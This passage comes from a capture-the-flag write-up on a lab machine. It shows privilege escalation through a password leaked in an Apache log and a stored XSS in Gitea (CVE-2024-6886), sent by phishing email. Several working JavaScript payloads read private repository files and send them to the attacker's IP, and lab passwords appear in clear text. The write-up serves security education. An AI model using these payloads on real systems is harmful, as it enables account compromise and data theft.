It also works over SSH, providing a nice save point in the box:

```console
oxdf@hacky$ sshpass -p soyunaprincesarosa ssh rosa@cat.htb
Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
...[snip]...
Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
rosa@cat:~$
```

## Shell as axel

### Enumeration

#### adm

rosa is a member of the adm group:

```console
rosa@cat:~$ id
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
```

According to the [Debian Wiki](https://wiki.debian.org/SystemGroups), this group is:

> used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.

On Cat that means access to the following files:

```console
rosa@cat:~$ find / -group adm 2>/dev/null
/var/log/audit
/var/log/audit/audit.log
/var/log/audit/audit.log.4
/var/log/audit/audit.log.1
/var/log/audit/audit.log.3
/var/log/audit/audit.log.2
/var/log/syslog.2.gz
/var/log/syslog.1
/var/log/apt/term.log.2.gz
/var/log/apt/term.log.5.gz
/var/log/apt/term.log.4.gz
/var/log/apt/term.log.6.gz
/var/log/apt/term.log.3.gz
/var/log/apt/term.log
/var/log/apt/term.log.1.gz
/var/log/auth.log.1
/var/log/kern.log.1
/var/log/dmesg
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/access.log.2.gz
/var/log/apache2/error.log.1
/var/log/apache2/error.log
/var/log/apache2/access.log.3.gz
/var/log/apache2/error.log.2.gz
/var/log/apache2/other_vhosts_access.log
/var/log/apache2/access.log.1
/var/log/apache2/error.log.3.gz
/var/log/kern.log
/var/log/installer
/var/log/installer/subiquity-server-info.log.2098
/var/log/installer/subiquity-server-debug.log.2098
/var/log/installer/installer-journal.txt
/var/log/installer/subiquity-curtin-install.conf
/var/log/installer/subiquity-client-info.log.2048
/var/log/installer/autoinstall-user-data
/var/log/installer/subiquity-curtin-apt.conf
/var/log/installer/subiquity-client-debug.log.2048
/var/log/mail.log
/var/log/mail.log.1
/var/log/syslog.3.gz
/var/log/cloud-init.log
/var/log/syslog
/var/log/cloud-init-output.log
/var/log/auth.log
/var/spool/rsyslog
/etc/hostname
/etc/cloud/cloud.cfg.d/99-installer.cfg
/etc/cloud/ds-identify.cfg
/etc/hosts
```

#### access.log

The Apache access logs log every attempt to request a page. When looking at the registration and login flows, I was thinking about how bad practice it is to do these as a GET request.

It turns out that was intentionally done as the intended path here. `/var/log/apache2/access.log` is full of entries of axel logging in every ten seconds or so:

```console
127.0.0.1 - - [04/Feb/2025:02:20:11 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

Their password is logged in the clear, “aNdZwgC4tI9gnVXv_e3Q”.

### su / SSH

That password works for `su` as axel:

```console
rosa@cat:~$ su - axel
Password:
axel@cat:~$
```

It also works over SSH:

```console
oxdf@hacky$ sshpass -p aNdZwgC4tI9gnVXv_e3Q ssh axel@cat.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
...[snip]...
You have mail.
...[snip]...
axel@cat:~$
```

And provides access to `user.txt`:

```console
axel@cat:~$ cat user.txt
78087ea7************************
```

## Shell as root

### Enumeration

#### Network Ports

axel’s home directory is relatively empty. There are a few services listening on localhost that are worth looking at:

```console
axel@cat:~$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:40601         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:54203         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:41135         0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
```

The most interesting is 3000, which is an instance of Gitea:

```console
axel@cat:~$ curl localhost:3000
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Cat</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ2F0Iiwic2hvcnRfbmFtZSI6IkNhdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9jYXQuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9jYXQuaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cG
UiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9jYXQuaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnN2ZyIsInR5cGUiOiJpbWFnZS9zdmcreG1sIiwic2l6ZXMiOiI1MTJ4NTEyIn1dfQ==">
        <meta name="author" content="Gitea - Git with a cup of tea">
        <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
        <meta name="keywords" content="go,git,self-hosted,gitea">
        <meta name="referrer" content="no-referrer">
...[snip]...
```

#### Mail

There are three users with mail in `/var/spool/mail`:

```console
axel@cat:/var/spool/mail$ ls
axel  jobert  root
```

axel can only access their own, which includes two messages from rosa:

```plaintext
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

The main points here are:

- There’s a new employee management system available on Gitea.
- rosa wants axel to email jobert with new ideas for websites, to include a repo clear descriptions of the ideas.

#### Gitea

I’ll use SSH `-L 3000:localhost:3000` to tunnel port 3000 from my host to Cat’s localhost. It loads an instance of [Gitea](https://about.gitea.com/):

![image-20250203215218686](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203215218686.png)

Without logging in, there are no repos available. axel’s password works here as well. axel is not able to access the Employee Management system mentioned in the email:

![image-20250203215608989](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203215608989.png)

### Access Employee Management

#### Identify Gitea Exploit

Gitea is running version 1.22.0. Searching for “gitea 1.22 cve” returns a few references to CVE-2024-6886:

![image-20250203220538641](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250203220538641.png)

[CVE-2024-6886](https://nvd.nist.gov/vuln/detail/CVE-2024-6886) is a vulnerability in Gitea where:

> Improper Neutralization of Input During Web Page Generation (XSS or ‘Cross-site Scripting’) vulnerability in Gitea Gitea Open Source Git Server allows Stored XSS.This issue affects Gitea Open Source Git Server: 1.22.0.

The [ExploitDB link](https://www.exploit-db.com/exploits/52077) describes how to exploit:

> `1. Log in to the application.
> 2. Create a new repository or modify an existing repository by clicking the Settings button from the `$username/$repo_name/settings` endpoint.
> 3. In the Description field, input the following payload:
>     <a href=javascript:alert()>XSS test</a>
> 4. Save the changes.
> 5. Upon clicking the repository description, the payload was successfully injected in the Description field. By clicking on the message, an alert box will appear, indicating the execution of the injected script.`

#### POC

To test this POC, I’ll create a new repo, and set the description field to the following:

```html
<a href="javascript:fetch('http://10.10.14.6/giteaxss');">Click me!</a>
```

Then clicked, this will generate an HTTP request to me. I found I had to add a file to the repo to get the description to show up on the front page. Then it looks like this:

![image-20250204060806214](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250204060806214.png)

Clicking on “Click me!” leads to a request to my page:

```console
10.10.14.6 - - [04/Feb/2025 06:05:00] code 404, message File not found
10.10.14.6 - - [04/Feb/2025 06:05:00] "GET /giteaxss HTTP/1.1" 404 -
```

I’ll reconnect SSH with an additional forward (`-L 2525:localhost:25`) to get access to the SMTP server on localhost. Now I can send mail to jobert:

```console
oxdf@hacky$ swaks --to jobert@localhost --from axel@localhost --header "Subject: New project" --body "Check this repo out: http://localhost:3000/axel/POC" -p 2525
=== Trying localhost:2525...
=== Connected to localhost.
<-  220 cat.htb ESMTP Sendmail 8.15.2/8.15.2/Debian-18; Tue, 4 Feb 2025 11:06:52 GMT; (No UCE/UBE) logging access from: localhost(OK)-localhost [127.0.0.1]
 -> EHLO hacky
<-  250-cat.htb Hello localhost [127.0.0.1], pleased to meet you
<-  250-ENHANCEDSTATUSCODES
<-  250-PIPELINING
<-  250-EXPN
<-  250-VERB
<-  250-8BITMIME
<-  250-SIZE
<-  250-DSN
<-  250-ETRN
<-  250-AUTH DIGEST-MD5 CRAM-MD5
<-  250-DELIVERBY
<-  250 HELP
 -> MAIL FROM:<axel@localhost>
<-  250 2.1.0 <axel@localhost>... Sender ok
 -> RCPT TO:<jobert@localhost>
<-  250 2.1.5 <jobert@localhost>... Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Tue, 04 Feb 2025 06:05:27 -0500
 -> To: jobert@localhost
 -> From: axel@localhost
 -> Subject: New project
 -> Message-Id: <20250204060527.506798@hacky>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 ->
 -> Check this repo out: http://localhost:3000/axel/POC
 ->
 ->
 -> .
<-  250 2.0.0 514B6qHh023230 Message accepted for delivery
 -> QUIT
<-  221 2.0.0 cat.htb closing connection
=== Connection closed with remote host.
```

A short time later, there’s a request:

```console
10.10.11.53 - - [04/Feb/2025 06:05:42] code 404, message File not found
10.10.11.53 - - [04/Feb/2025 06:05:42] "GET /giteaxss HTTP/1.1" 404 -
```

It works, and jobert is clicking.

#### Employee Management README

It seems clear that I need to get access to the Employee-managment repo. The mail specifically calls out the `README.md` file, so I’ll write a payload to have jobert get that and then send it to me:

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(response => response.text()).then(data => fetch('http://10.10.14.6/?exfil=' + btoa(data)));">Click me!</a>
```

The repo gets cleaned up pretty quickly, so I’ll create a new one and add this as the description. After adding a file, the link is present. I’ll click and it returns data:

```console
10.10.14.6 - - [04/Feb/2025 06:18:41] "GET /?exfil=Tm90IGZvdW5kLgo= HTTP/1.1" 200 -
```

That decodes to:

```console
oxdf@hacky$ echo "Tm90IGZvdW5kLgo=" | base64 -d
Not found.
```

Which makes sense, as I can’t access the repo.

A short while later, I get something from Cat:

```console
10.10.11.53 - - [04/Feb/2025 06:20:02] "GET /?exfil=IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu HTTP/1.1" 200 -
```

That decodes to:

```console
oxdf@hacky$ echo "IyBFbXBsb3llZSBNYW5hZ2VtZW50ClNpdGUgdW5kZXIgY29uc3RydWN0aW9uLiBBdXRob3JpemVkIHVzZXI6IGFkbWluLiBObyB2aXNpYmlsaXR5IG9yIHVwZGF0ZXMgdmlzaWJsZSB0byBlbXBsb3llZXMu" | base64 -d
# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
```

Nothing useful here.

#### Fetch List of Files

I think most people from here just guessed at filenames until they got what they needed, but I find that unsatisfying. I can try to fetch the entire `http://localhost:3000/administrator/Employee-management/` page, but nothing comes back, likely because it’s too big for my URL exfil.

I’ll write some JavaScript that will fetch the files list table from that page:

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/')
.then(response => response.text())
.then(data => {
let parser = new DOMParser();
let doc = parser.parseFromString(data, 'text/html');
let rows = doc.getElementById('repo-files-table').querySelectorAll('tr.entry');
let entries = Array.from(rows).map(row => row.getAttribute('data-entryname'));
fetch('http://10.10.14.6/?exfil=' + entries.join(','))
});">Click me!</a>
```

To craft this, I mostly worked out of the dev tools console to get something working that would give a list of files from my repo, and then updated it to get the repo that I can’t read. After a wait, there’s data:

```console
10.10.11.53 - - [04/Feb/2025 06:39:10] "GET /?exfil=chart.min.js,dashboard.php,index.php,logout.php,README.md,style.css HTTP/1.1" 200 -
```

#### Get Source

With this list of files, it’s easy enough to read them. I’ll make a payload to get `index.php`:

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.6/?exfil=' + btoa(data)));">Click me!</a>
```

The exfil comes:

```console
10.10.11.53 - - [04/Feb/2025 06:41:44] "GET /?exfil=PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo/PgoK HTTP/1.1" 200 -
```

That decodes to:

```php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {

    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

There’s a new admin password.

### su

That password works for root using `su`:

```console
axel@cat:~$ su -
Password:
root@cat:~#
```

And I can read the final flag:

```console
root@cat:~# cat root.txt
de491d3e************************
```
